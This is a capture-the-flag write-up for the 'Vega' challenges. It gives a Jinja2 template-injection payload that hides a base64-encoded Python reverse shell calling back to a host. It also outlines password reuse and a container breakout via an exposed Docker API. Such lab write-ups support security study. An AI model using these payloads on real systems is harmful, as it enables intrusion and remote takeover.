# Vega I

## Description
One of our undercover agents who was sent to take down this website trafficking alien kittens was found out. In fear of his lives, he has fled the country, but not before dropping the password in the form of a `hint` on the website to unlock all the incriminating evidence that he has sent us. However, our communications got cut when the enemy was found eavesdropping on the conversation. It is up to you, Agent 470, to find this hint and uncover the secret password.

## Solution
Using SSTI, gain access to the system with a python reverse shell.

PoC of reverse shell exploit:
```
{% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMC4wLjEiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=')).read()" %}
{% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
        {% for b in c.__init__.func_globals.values() %}
            {% if b.__class__ == {}.__class__ %}
                {% if 'eval' in b.keys() %}
                    {{ b['eval'](d) }}
                {% endif %}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```
References:
- https://github.com/vulhub/vulhub/tree/master/flask/ssti
- https://github.com/epinna/tplmap
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# Vega II

## Description
Unlocking the evidence archive reveals an intricate internal network which consists of a hidden internal network. We believe that more incriminating evidence can be found there. Infiltrate a server that has access to the internal network and submit the flag found in the root folder.

## Solution
Simply upload a static `nmap` binary to give you host discovery capabilities.
Doing `cat -v /etc/passwd` in the first container reveals a passwd file obfuscated with nonprinting characters. 
The password for `root` user can be found in the user info. This password is also the same for the DB container. 
Simply ssh into the DB container and `cat /root/flag`.

# Vega III

## Description
After gaining access to the internal network, you receive two hints that simply says: "Unraveling the Dream within the Dream" as well as "After this, there is no turning back. You take the blue pill-the story ends, 
you wake up in your bed and believe whatever you want to believe. You take the red pill-you stay in Wonderland, and I show you how deep the rabbit hole goes.". 
After thinking hard for a while, you suddenly had a hunch behind the meaning of the words and proceed to obtain the last flag.

## Solution
In the DB container, you have root access. This give you access to package management capabilities. As the 
container is running on `Alpine Linux`, the package manager used is `apk`. Install `docker` with `apk --no-cache add docker`. You 
can upload another static nmap binary to the container to discover the address of the last container. For the internal container, port 2375 
(Docker API HTTP) is exposed to which you can interact with it. Afterwards, perform a docker breakout into the host and find the last flag at `/root/flag`.
